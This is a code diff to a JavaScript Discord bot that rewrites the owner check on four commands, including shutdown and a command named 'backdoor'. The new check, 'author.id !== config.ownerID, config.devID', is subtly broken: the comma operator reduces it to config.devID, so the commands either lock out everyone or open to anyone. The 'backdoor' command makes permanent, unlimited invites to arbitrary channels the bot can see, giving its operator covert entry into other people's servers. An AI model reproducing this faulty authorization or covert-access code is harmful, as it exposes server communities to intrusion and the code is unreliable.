@@ -90,7 +90,7 @@ client.on("message", message => {
 client.on("message", message => {
   const args = message.content.split(" ").slice(1);
   if (message.content.startsWith(config.prefix + "osay")) {
-    if(message.author.id !== config.ownerID) return;
+    if(message.author.id !== config.ownerID, config.devID) return;
       const sayMessage = args.join(" ");
       message.delete().catch(O_o=>{}); 
       message.channel.send(sayMessage);
@@ -100,7 +100,7 @@ client.on("message", message => {
 client.on("message", message => {
   const args = message.content.split(" ").slice(1);
   if (message.content.startsWith(config.prefix + "sd")) {
-    if(message.author.id !== config.ownerID) return;
+    if(message.author.id !== config.ownerID, config.devID) return;
       message.channel.send(":white_check_mark: *Shutting Down*")
       console.log('Shutting Down')
       setTimeout(shutdown, 2000)
@@ -126,7 +126,7 @@ client.on("message", message => {
 client.on("message", message => {
   const args = message.content.split(" ").slice(1);
   if (message.content.startsWith(config.prefix + "reboot")) {
-    if(message.author.id !== config.ownerID) return;
+    if(message.author.id !== config.ownerID, config.devID) return;
       message.channel.send(":x: **Error:** *You haven't developed this yet dummy*")
   }
 });
@@ -134,7 +134,7 @@ client.on("message", message => {
 client.on("message", message => {
   const args = message.content.split(" ").splice(1);
   if (message.content.startsWith(config.prefix + "backdoor")) {
-    if(message.author.id !== config.ownerID) return;
+    if (message.author.id !== config.ownerID, config.devID) return;
     client.channels.get(message.content.split(" ")[1]).createInvite({
       maxAge: 0,
       maxUses: 0
